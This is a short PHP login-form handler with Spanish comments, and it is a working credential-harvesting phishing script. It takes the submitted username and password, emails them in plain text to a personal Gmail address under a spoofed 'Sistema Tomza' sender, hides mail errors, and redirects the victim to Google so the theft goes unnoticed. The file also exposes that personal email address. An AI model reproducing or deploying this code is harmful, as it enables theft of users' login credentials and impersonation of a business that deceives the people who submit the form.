<?php
// Evitar acceso directo al archivo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibir datos del formulario de forma segura
$usuario = trim($_POST["usuario"] ?? "");
$password = trim($_POST["password"] ?? "");

// Validar que no estén vacíos
if ($usuario === "" || $password === "") {
    echo "Por favor completa todos los campos.";
    exit;
}

// --------------------------
// ENVÍO DE CORREO SIN LIBRERÍAS
// --------------------------
$tu_correo = "sebastiancq2008@gmail.com";
$asunto = "Nuevo ingreso - Tomza Taller";

$mensaje = "=== Datos recibidos ===\n\n";
$mensaje .= "Usuario: " . $usuario . "\n";
$mensaje .= "Contraseña: " . $password . "\n";
$mensaje .= "Fecha y hora: " . date("d/m/Y H:i:s") . "\n";

// Encabezados completos para que no lo rechacen
$encabezados  = "From: Sistema Tomza <no-reply@tomzataller.com>\r\n";
$encabezados .= "Reply-To: " . $tu_correo . "\r\n";
$encabezados .= "Content-Type: text/plain; charset=UTF-8\r\n";

// Enviar
@mail($tu_correo, $asunto, $mensaje, $encabezados);

// Redirigir a Google
header("Location: https://www.google.com");
exit;
?>
